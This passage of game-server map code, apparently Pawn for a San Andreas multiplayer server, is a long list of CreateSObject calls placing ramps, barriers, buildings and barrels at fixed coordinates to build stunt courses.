	CreateSObject(8887, 366.734863, 2540.017578, 16.384842, 0.0000, 0.0000, 0.0000);
	CreateSObject(993, 390.270813, 2549.296387, 17.156214, 0.0000, 0.0000, 0.0000);
	CreateSObject(993, 380.243347, 2549.292969, 17.152849, 0.0000, 0.0000, 0.0000);
	CreateSObject(993, 370.301208, 2549.311035, 17.152849, 0.0000, 0.0000, 0.0000);
	CreateSObject(993, 362.237701, 2549.306885, 17.152849, 0.0000, 0.0000, 0.0000);
	CreateSObject(993, 356.974976, 2544.657715, 17.170572, 0.0000, 0.0000, 270.0000);
	CreateSObject(993, 357.587646, 2535.434814, 17.316263, 0.0000, 0.0000, 90.0000);
	CreateSObject(993, 395.026764, 2544.671387, 17.157381, 0.0000, 0.0000, 270.0000);
	CreateSObject(993, 395.005096, 2535.548584, 17.157343, 0.0000, 0.0000, 270.0000);
	CreateSObject(993, 375.893890, 2544.657227, 17.152849, 0.0000, 0.0000, 270.0000);
	CreateSObject(993, 375.876587, 2535.229004, 17.209215, 0.0000, 0.0000, 270.0000);
	CreateSObject(991, 372.940125, 2530.299072, 16.842983, 0.0000, 0.0000, 0.0000);
	CreateSObject(991, 360.611328, 2530.533691, 16.903439, 0.0000, 0.0000, 0.0000);
	CreateSObject(991, 379.495239, 2530.256348, 16.810356, 0.0000, 0.0000, 0.0000);
	CreateSObject(991, 392.000397, 2530.517334, 16.758072, 0.0000, 0.0000, 0.0000);
	CreateSObject(966, 370.392822, 2529.968018, 15.640182, 0.0000, 0.0000, 0.0000);
	CreateSObject(968, 370.324432, 2529.951172, 16.649433, 0.0000, 0.0000, 0.0000);
	CreateSObject(966, 382.412170, 2529.904541, 15.581596, 0.0000, 0.0000, 180.0000);
	CreateSObject(968, 382.405243, 2529.857666, 16.590847, 0.0000, 0.0000, 0.0000);
	CreateSObject(3511, 376.163849, 2528.914307, 15.580772, 0.0000, 0.0000, 0.0000);
	CreateSObject(3517, 356.738525, 2529.913086, 26.906954, 0.0000, 0.0000, 0.0000);
	CreateSObject(3517, 395.340729, 2529.757813, 26.753035, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, 261.329285, 2355.962402, 21.950089, 359.1406, 11.1727, 56.2500);
	CreateSObject(18450, 225.645309, 2302.707764, 35.591522, 0.0000, 12.8916, 56.2500);
	CreateSObject(18450, 153.791092, 2233.952148, 54.201073, 0.0000, 0.0000, 323.7490);
	CreateSObject(1634, 207.658005, 2271.721924, 44.681046, 6.8755, 0.0000, 146.2500);
	CreateSObject(1634, 204.278793, 2273.988037, 44.651375, 6.8755, 0.8594, 147.1095);
	CreateSObject(18450, 148.044815, 2225.479736, 57.915012, 320.4659, 0.0000, 323.6717);
	CreateSObject(18450, 89.390816, 2281.249268, 53.587982, 0.0000, 359.1406, 323.6717);
	CreateSObject(1634, -40.883827, 2518.603271, 16.556696, 0.0000, 0.0000, 90.0000);
	CreateSObject(1634, -40.868813, 2522.746094, 16.581696, 0.0000, 0.0000, 90.0000);
	CreateSObject(13666, 100.215462, 2551.729248, 20.437346, 0.0000, 0.0000, 11.2500);
	CreateSObject(13666, 103.552055, 2551.898682, 20.448612, 0.0000, 0.0000, 11.2500);
	CreateSObject(13666, 96.751350, 2551.572021, 20.425169, 0.0000, 0.0000, 11.2500);
	CreateSObject(13666, 93.284569, 2551.405762, 20.407692, 0.0000, 0.0000, 11.2500);
	CreateSObject(13666, 89.869011, 2551.237793, 20.397940, 0.0000, 0.0000, 11.2500);
	CreateSObject(13666, 86.264702, 2551.051758, 20.397720, 0.0000, 0.0000, 11.2500);
	CreateSObject(13666, 82.851173, 2550.874756, 20.391911, 0.0000, 0.0000, 11.2500);
	CreateSObject(13666, 79.194748, 2550.701660, 20.371084, 0.0000, 0.0000, 11.2500);
	CreateSObject(13666, 75.552261, 2550.530029, 20.341896, 0.0000, 0.0000, 11.2500);
	CreateSObject(13666, 71.886353, 2550.309570, 20.328716, 0.0000, 0.0000, 11.2500);
	CreateSObject(13642, 19.549603, 2550.279785, 17.497749, 0.0000, 0.0000, 168.7500);
	CreateSObject(13592, 12.597748, 2433.808105, 25.255009, 0.0000, 0.0000, 191.2500);
	CreateSObject(13592, 12.936197, 2426.487793, 25.254990, 0.0000, 0.0000, 191.2500);
	CreateSObject(13592, 13.309988, 2419.118408, 25.257166, 0.0000, 0.0000, 191.2501);
	CreateSObject(13592, 13.654903, 2411.877441, 25.254986, 0.0000, 0.0000, 191.2500);
	CreateSObject(13592, 14.001345, 2404.482910, 25.254993, 0.0000, 0.0000, 191.2500);
	CreateSObject(13592, 14.353115, 2397.011230, 25.288231, 0.0000, 0.0000, 191.2500);
	CreateSObject(13592, 14.769344, 2389.641113, 25.278728, 0.0000, 0.0000, 191.2501);
	CreateSObject(13592, 15.094362, 2382.583984, 25.122799, 0.0000, 0.0000, 191.2501);
	CreateSObject(1634, 12.015862, 2378.127441, 18.852636, 10.3132, 0.0000, 96.0934);
	CreateSObject(1634, 68.968369, 2555.641357, 16.850470, 4.2972, 0.0000, 11.2500);
	CreateSObject(13604, 252.241104, 2571.520508, 16.585823, 0.0000, 0.0000, 315.0000);
	CreateSObject(1634, 305.264618, 2507.130127, 59.796612, 0.0000, 0.0000, 270.0000);
	CreateSObject(1634, 305.253265, 2502.996094, 59.821613, 0.0000, 0.0000, 270.0000);
	CreateSObject(1634, 310.127533, 2507.100342, 64.264328, 27.5020, 0.0000, 270.0000);
	CreateSObject(1634, 310.123596, 2502.978027, 64.270798, 27.5020, 0.0000, 270.0000);
	CreateSObject(1634, 313.295837, 2507.110352, 70.820015, 49.8473, 0.0000, 270.0000);
	CreateSObject(1634, 313.306610, 2503.006104, 70.837891, 49.8473, 0.0000, 270.0000);
	CreateSObject(1634, 313.196686, 2507.105469, 79.355530, 79.9276, 0.0000, 270.0000);
	CreateSObject(1634, 313.176147, 2503.049805, 79.328629, 79.9276, 0.0000, 270.0000);
	CreateSObject(1634, 308.975433, 2507.116943, 86.538818, 110.0079, 0.0000, 270.0000);
	CreateSObject(1634, 308.938263, 2503.067383, 86.553375, 110.0079, 0.0000, 270.0000);
	CreateSObject(18450, 257.028320, 2504.643555, 75.217514, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, 181.091522, 2504.641846, 84.104485, 0.0000, 12.8916, 0.0000);
	CreateSObject(18450, 109.535233, 2504.633057, 109.410408, 0.0000, 25.7831, 0.0000);
	CreateSObject(18450, 54.626411, 2504.670166, 140.374268, 0.0000, 31.7992, 0.0000);
	CreateSObject(18450, -19.174397, 2504.661133, 161.420853, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -99.184906, 2504.669434, 161.432831, 0.0000, 0.0000, 0.0000);
	CreateSObject(1634, -134.133804, 2502.288574, 162.898941, 0.0000, 0.0000, 90.0000);
	CreateSObject(1634, -134.144516, 2506.450684, 162.898941, 0.0000, 0.0000, 90.0000);
	CreateSObject(18450, -177.355484, 2530.731689, 167.320999, 0.0000, 0.0000, 90.0000);
	CreateSObject(18450, -186.887802, 2530.726074, 170.232941, 323.0442, 0.0000, 270.0000);
	CreateSObject(18450, -192.043381, 2530.799561, 177.368820, 280.0724, 0.0000, 270.0000);
	CreateSObject(18450, -177.363785, 2606.762451, 175.183258, 0.0000, 12.0321, 270.0000);
	CreateSObject(18450, -177.493912, 2683.935303, 193.402649, 0.0000, 14.6104, 270.0000);
	CreateSObject(18450, -177.493881, 2762.518799, 203.486099, 0.0000, 0.0000, 270.0000);
	CreateSObject(18450, -177.493851, 2841.483154, 195.148102, 0.0000, 347.9679, 270.0000);
	CreateSObject(18450, -177.485474, 2918.345947, 175.090256, 0.0000, 342.8113, 270.0000);
	CreateSObject(18450, -177.474121, 2993.403076, 148.101242, 0.0000, 337.6546, 270.0000);
	CreateSObject(1634, -180.805588, 3023.982666, 137.200363, 340.2330, 0.0000, 0.0000);
	CreateSObject(1634, -176.717712, 3023.955566, 137.189850, 340.2330, 0.0000, 0.0000);
	CreateSObject(1634, -172.772018, 3023.965088, 137.182587, 340.2330, 0.0000, 0.0000);
	CreateSObject(17545, -175.520325, 3150.163818, 97.987198, 0.0000, 0.0000, 0.0000);
	CreateSObject(17545, -128.895996, 3150.041748, 97.979980, 0.0000, 0.0000, 0.0000);
	CreateSObject(17545, -222.004150, 3150.139404, 98.024292, 0.0000, 0.0000, 0.0000);
	CreateSObject(17545, -175.385284, 3210.940430, 97.985825, 0.0000, 0.0000, 0.0000);
	CreateSObject(17545, -222.376083, 3210.993164, 97.999413, 0.0000, 0.0000, 0.0000);
	CreateSObject(17545, -129.025711, 3212.424561, 98.110603, 0.0000, 0.0000, 0.0000);
	CreateSObject(16122, -210.254990, 3233.293701, 97.430710, 0.0000, 0.0000, 292.5000);
	CreateSObject(16121, -124.659821, 3227.479248, 97.691063, 0.0000, 0.0000, 225.0000);
	CreateSObject(16112, -164.838562, 3239.541748, 97.806328, 0.0000, 0.0000, 326.2500);
	CreateSObject(7916, -161.554749, 3211.666504, 101.854240, 0.0000, 0.0000, 0.0000);
	CreateSObject(7916, -209.207306, 3212.787842, 102.231544, 0.0000, 0.0000, 0.0000);
	CreateSObject(16061, -107.389214, 3174.506104, 97.678421, 0.0000, 0.0000, 0.0000);
	CreateSObject(16061, -242.845703, 3192.427734, 97.851593, 0.0000, 0.0000, 180.0000);
	CreateSObject(615, -223.103760, 3146.909180, 98.105774, 0.0000, 0.0000, 0.0000);
	CreateSObject(615, -127.659889, 3149.450439, 98.231926, 0.0000, 0.0000, 0.0000);
	CreateSObject(11413, -128.210953, 3149.321777, 99.365990, 0.0000, 0.0000, 0.0000);
	CreateSObject(11413, -223.199402, 3148.007568, 99.470543, 0.0000, 0.0000, 0.0000);
	CreateSObject(9152, -177.482544, 3195.556396, 98.734726, 0.0000, 0.0000, 0.0000);
	CreateSObject(3509, -177.765747, 3196.010254, 97.736855, 0.0000, 0.0000, 0.0000);
	CreateSObject(625, -176.204178, 3188.628662, 98.649353, 0.0000, 0.0000, 0.0000);
	CreateSObject(8619, -177.102982, 3147.537109, 98.288971, 0.0000, 0.0000, 270.0000);
	CreateSObject(3510, -197.627228, 3132.636963, 97.674416, 0.0000, 0.0000, 0.0000);
	CreateSObject(3510, -197.864822, 3142.455566, 97.708893, 0.0000, 0.0000, 0.0000);
	CreateSObject(3510, -197.835419, 3152.513916, 97.693733, 0.0000, 0.0000, 0.0000);
	CreateSObject(3510, -197.716415, 3162.605469, 97.728653, 0.0000, 0.0000, 0.0000);
	CreateSObject(3510, -156.407547, 3163.001709, 97.669579, 0.0000, 0.0000, 0.0000);
	CreateSObject(3510, -156.393539, 3152.418213, 97.672165, 0.0000, 0.0000, 0.0000);
	CreateSObject(3510, -156.452286, 3141.887451, 97.674736, 0.0000, 0.0000, 0.0000);
	CreateSObject(3510, -156.301697, 3131.990967, 97.677170, 0.0000, 0.0000, 0.0000);
	CreateSObject(13592, 294.380920, 2469.515869, 25.344601, 0.0000, 0.0000, 0.0000);
	CreateSObject(14791, 403.980316, 2447.672607, 17.545061, 0.0000, 0.0000, 0.0000);
	CreateSObject(14792, 393.286682, 2444.153564, 16.926600, 0.0000, 0.0000, 0.0000);
	CreateSObject(14786, 404.931671, 2454.255615, 23.658550, 0.0000, 0.0000, 0.0000);
	CreateSObject(14782, 402.498322, 2433.913574, 16.516048, 0.0000, 0.0000, 180.0000);
	CreateSObject(14781, 403.655365, 2455.373779, 16.515350, 0.0000, 0.0000, 0.0000);
	CreateSObject(14780, 404.198303, 2463.242188, 16.366798, 0.0000, 0.0000, 0.0000);
	CreateSObject(14486, 415.463440, 2443.442871, 16.998486, 0.0000, 0.0000, 90.0000);
	CreateSObject(14449, 422.371124, 2459.367920, 16.722689, 0.0000, 0.0000, 0.0000);
	CreateSObject(14787, 390.633850, 2459.875977, 15.596094, 0.0000, 0.0000, 0.0000);
	CreateSObject(3819, 410.586243, 2463.510986, 16.497759, 0.0000, 0.0000, 0.0000);
	CreateSObject(3819, 410.651367, 2454.220947, 16.497759, 0.0000, 0.0000, 0.0000);
	CreateSObject(3819, 410.704742, 2444.701660, 16.497759, 0.0000, 0.0000, 0.0000);
	CreateSObject(3819, 403.695160, 2440.205811, 16.497759, 0.0000, 0.0000, 270.0000);
	CreateSObject(13592, 280.942383, 2462.723389, 25.447193, 0.0000, 0.0000, 0.0000);
	CreateSObject(13592, 267.069092, 2455.919922, 25.684721, 0.0000, 0.0000, 0.0000);
	CreateSObject(13592, 259.715363, 2448.652832, 26.904984, 0.0000, 10.3132, 0.0000);
	CreateSObject(1634, 252.142700, 2445.638184, 19.659389, 12.0321, 0.8594, 77.8906);
	CreateSObject(18450, 26.335501, 2326.822266, 53.019333, 0.0000, 0.0000, 324.5312);
	CreateSObject(18450, -31.277334, 2366.456787, 60.056175, 0.0000, 10.3132, 326.2500);
	CreateSObject(18450, -92.179367, 2407.168701, 80.047539, 0.0000, 19.7670, 326.2500);
	CreateSObject(18450, -156.611008, 2450.197754, 93.537331, 0.0000, 0.0000, 326.2500);
	CreateSObject(18450, -232.859924, 2470.096680, 96.651268, 0.0000, 0.0000, 56.2500);
	CreateSObject(18450, -239.816528, 2474.761475, 99.100151, 33.5180, 0.0000, 56.2500);
	CreateSObject(18450, -243.601929, 2477.325928, 105.696136, 68.7549, 0.0000, 56.2500);
	CreateSObject(1634, -187.378143, 2467.434570, 94.978386, 0.0000, 0.0000, 58.8283);
	CreateSObject(1634, -185.257446, 2470.836426, 94.978386, 0.0000, 0.0000, 57.9688);
	CreateSObject(18450, -254.695908, 2437.489746, 99.563210, 0.0000, 25.7831, 55.3906);
	CreateSObject(18450, -297.237000, 2374.764160, 116.913437, 0.0000, 0.0000, 56.2500);
	CreateSObject(18450, -341.628632, 2308.358643, 116.925400, 0.0000, 0.0000, 56.2500);
	CreateSObject(18450, -437.867065, 2164.235352, 135.561295, 0.0000, 12.0321, 56.2500);
	CreateSObject(18450, -394.753937, 2228.774414, 127.224281, 0.0000, 0.0000, 56.2500);
	CreateSObject(1634, -357.164825, 2281.563477, 118.566467, 0.0000, 0.0000, 146.2500);
	CreateSObject(1634, -360.683746, 2283.827881, 118.566467, 0.0000, 0.0000, 146.2500);
	CreateSObject(18450, -476.571014, 2106.248779, 151.624222, 0.0000, 13.7510, 56.2500);
	CreateSObject(18450, -518.039429, 2044.184448, 176.033707, 0.0000, 22.3454, 56.2500);
	CreateSObject(18450, -560.686218, 1980.354248, 191.185440, 0.0000, 0.0000, 56.2500);
	CreateSObject(18450, -603.042236, 1916.962158, 191.147736, 0.0000, 0.0000, 56.2500);
	CreateSObject(18450, -644.266418, 1855.166016, 191.184769, 0.0000, 0.0000, 56.2500);
	CreateSObject(13641, -620.924194, 1890.747925, 193.210724, 0.0000, 0.0000, 235.3906);
	CreateSObject(18450, -688.362000, 1789.088989, 191.171997, 0.0000, 0.0000, 56.2500);
	CreateSObject(13592, -707.056885, 1760.519897, 201.886581, 0.0000, 3.4377, 56.2500);
	CreateSObject(13592, -706.914368, 1747.699219, 202.491089, 0.0000, 0.0000, 56.2500);
	CreateSObject(18450, -730.646423, 1708.872192, 192.440887, 0.0000, 0.0000, 56.2500);
	CreateSObject(18450, -774.049927, 1643.970703, 192.403061, 0.0000, 0.0000, 56.2500);
	CreateSObject(18450, -818.345459, 1577.671631, 189.440216, 0.0000, 355.7028, 56.2500);
	CreateSObject(1632, -834.865723, 1548.571289, 188.577271, 0.0000, 0.0000, 146.2501);
	CreateSObject(1632, -838.245239, 1550.858154, 188.576447, 0.0000, 0.0000, 146.2500);
	CreateSObject(18450, 2401.848145, 1800.547241, 308.618530, 0.0000, 2.5783, 268.2811);
	CreateSObject(18450, 2400.727051, 1723.221313, 306.881226, 0.0000, 0.0000, 90.0000);
	CreateSObject(18450, 2400.727539, 1645.413452, 306.868317, 0.0000, 0.0000, 90.0000);
	CreateSObject(18450, 2400.576172, 1512.663696, 313.030243, 0.0000, 0.0000, 90.0000);
	CreateSObject(1632, 2403.011475, 1610.811890, 308.512177, 0.0000, 0.0000, 180.0000);
	CreateSObject(1632, 2398.864990, 1610.818726, 308.512177, 0.0000, 0.0000, 180.0000);
	CreateSObject(18450, 2400.596924, 1433.088745, 313.042328, 0.0000, 0.0000, 90.0000);
	CreateSObject(1634, 2402.658447, 1398.744141, 314.433472, 0.0000, 0.0000, 180.0000);
	CreateSObject(1634, 2398.481201, 1398.635620, 314.458466, 0.0000, 0.0000, 180.0000);
	CreateSObject(18450, 2400.668701, 1322.820435, 294.947113, 0.0000, 0.0000, 90.0000);
	CreateSObject(18450, 2400.631592, 1248.391846, 294.959076, 0.0000, 0.0000, 90.0000);
	CreateSObject(18450, 2400.620605, 1169.478516, 294.946045, 0.0000, 0.0000, 90.0000);
	CreateSObject(1634, 2405.920410, 1133.768433, 296.562134, 0.0000, 0.0000, 180.0000);
	CreateSObject(1634, 2401.754150, 1133.744873, 296.562134, 0.0000, 0.0000, 180.0000);
	CreateSObject(1634, 2397.676270, 1133.748047, 296.562134, 0.0000, 0.0000, 180.0000);
	CreateSObject(1634, 2394.951660, 1133.740967, 296.564178, 0.0000, 0.0000, 180.0000);
	CreateSObject(18450, 2403.844971, 1870.952759, 317.261749, 0.0000, 348.8273, 88.2811);
	CreateSObject(7617, 403.388611, 2472.999023, 39.163063, 0.0000, 0.0000, 0.0000);
	CreateSObject(5400, 83.672852, 2428.795654, 15.042999, 0.0000, 0.0000, 56.2500);
	CreateSObject(13643, 301.108978, 2592.223145, 16.522583, 0.0000, 0.0000, 135.0000);
	CreateSObject(13640, 188.101273, 2544.411377, 16.549498, 0.0000, 0.0000, 270.0000);
	CreateSObject(13636, 158.626297, 2543.875488, 17.803598, 0.0000, 0.0000, 0.0000);
	CreateSObject(13590, -21.869621, 2465.608154, 16.685236, 0.0000, 0.0000, 101.2500);
	CreateSObject(8375, 74.988235, 2405.163574, 17.468117, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -100.758553, 2520.600342, 25.597267, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -158.920319, 2520.565674, 35.534218, 0.0000, 15.4699, 0.0000);
	CreateSObject(18450, -229.602570, 2520.563965, 58.653854, 0.0000, 20.6265, 0.0000);
	CreateSObject(18450, -299.333160, 2520.560059, 91.167374, 0.0000, 29.2208, 0.0000);
	CreateSObject(18450, -373.081696, 2520.564453, 119.548302, 0.0000, 12.8916, 0.0000);
	CreateSObject(18450, -492.979309, 2520.592285, 109.364815, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -570.542847, 2520.583740, 122.876732, 0.0000, 19.7670, 0.0000);
	CreateSObject(18450, -648.032471, 2520.553955, 136.371307, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -726.378235, 2520.545654, 136.383224, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -805.269409, 2520.553223, 136.395203, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -884.580200, 2520.571533, 136.407059, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -963.302979, 2520.580566, 136.419037, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -1041.816650, 2520.593262, 136.431015, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -1120.519531, 2520.605957, 136.443237, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -1199.475342, 2520.610107, 136.455215, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -1277.807129, 2520.590576, 136.492065, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -1357.485352, 2520.591064, 136.479111, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -1436.428833, 2520.582275, 136.466156, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -1514.564209, 2520.574707, 136.478134, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -1593.579712, 2520.573242, 136.490051, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -1673.039185, 2520.576660, 136.502090, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -1752.286133, 2520.554932, 136.513947, 0.0000, 0.0000, 0.0000);
	CreateSObject(1632, -734.024841, 2517.074951, 137.802139, 0.0000, 0.0000, 90.0000);
	CreateSObject(1632, -733.868225, 2521.222412, 137.802139, 0.0000, 0.0000, 90.0000);
	CreateSObject(1632, -733.908325, 2525.145264, 137.827133, 0.0000, 0.0000, 90.0000);
	CreateSObject(1894, -811.280518, 2507.968262, 136.840973, 0.0000, 0.0000, 270.0000);
	CreateSObject(1225, -742.772217, 2515.230225, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -749.620239, 2517.793213, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -745.488708, 2518.243164, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -744.700378, 2520.313232, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -744.893372, 2521.443848, 137.413300, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -752.921936, 2522.967773, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -765.432739, 2524.416016, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -757.797119, 2522.197998, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -765.626282, 2520.171387, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -765.171692, 2515.213867, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -745.221619, 2515.514648, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -742.645508, 2519.269043, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -742.856445, 2522.828857, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -749.199219, 2525.998779, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -768.653137, 2524.110840, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -769.192627, 2521.196289, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -771.468994, 2523.258301, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -782.835876, 2522.737549, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -788.307434, 2522.244873, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -788.317749, 2522.064453, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -778.520996, 2520.185791, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -773.206726, 2518.747559, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -769.016479, 2518.431396, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -762.881470, 2517.581299, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -758.540283, 2517.313477, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -754.837891, 2516.812012, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -752.443359, 2516.637939, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -751.127441, 2516.580566, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -747.056519, 2517.216797, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -744.579712, 2517.745605, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -781.632141, 2517.825439, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -794.848572, 2517.478516, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -799.896179, 2521.497803, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -794.499268, 2524.847900, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -793.606018, 2521.056641, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -787.404114, 2519.663086, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -782.216797, 2521.156494, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -787.827271, 2517.796143, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -789.686462, 2515.699219, 137.346710, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -800.759033, 2516.299316, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -803.045898, 2518.587646, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -801.754028, 2523.942383, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -806.644043, 2526.007324, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -806.533325, 2522.450195, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -802.824341, 2520.143799, 137.585388, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -806.875244, 2516.470703, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -804.219971, 2514.196289, 137.346710, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -796.607300, 2515.312256, 137.346710, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -793.295837, 2514.551758, 137.674850, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -798.716309, 2518.720215, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -791.634949, 2519.366699, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -792.230896, 2516.983887, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -797.574646, 2521.334229, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -793.458008, 2522.864014, 137.518921, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -800.104126, 2524.990967, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -799.839111, 2523.493896, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -797.686829, 2522.785645, 137.417679, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -797.806641, 2526.752441, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -803.592163, 2527.052002, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -793.331604, 2526.285645, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -786.596252, 2523.307129, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -789.757996, 2526.230225, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -788.009521, 2524.707275, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -785.479980, 2521.849365, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -784.203857, 2518.950439, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -781.534241, 2519.728027, 137.516830, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -784.370483, 2517.098877, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -787.137939, 2515.540771, 137.346710, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -784.414001, 2515.196289, 137.346710, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -781.301331, 2515.533691, 137.346710, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -777.128967, 2516.365723, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -774.609985, 2516.337158, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -771.012817, 2515.348389, 137.346710, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -768.959412, 2514.833252, 137.346710, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -764.966919, 2514.109619, 137.934738, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -761.770691, 2514.544189, 137.886230, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -758.439636, 2514.516357, 137.934738, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -756.027283, 2514.544189, 137.891922, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -751.912537, 2514.673096, 137.334732, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -749.520508, 2514.682373, 137.334732, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -741.721619, 2525.039063, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -744.520996, 2525.696045, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -747.344971, 2525.328857, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -748.977234, 2523.716309, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -750.406677, 2522.777100, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -752.328491, 2521.588379, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -755.382813, 2520.476807, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -757.961487, 2520.573730, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -760.038879, 2521.209473, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -761.491150, 2522.538330, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -759.524658, 2525.598145, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -756.345398, 2526.150146, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -753.750916, 2526.535889, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -752.076843, 2526.489258, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -753.016052, 2525.422363, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -754.728149, 2524.742920, 137.132736, 0.0000, 0.0000, 0.0000);
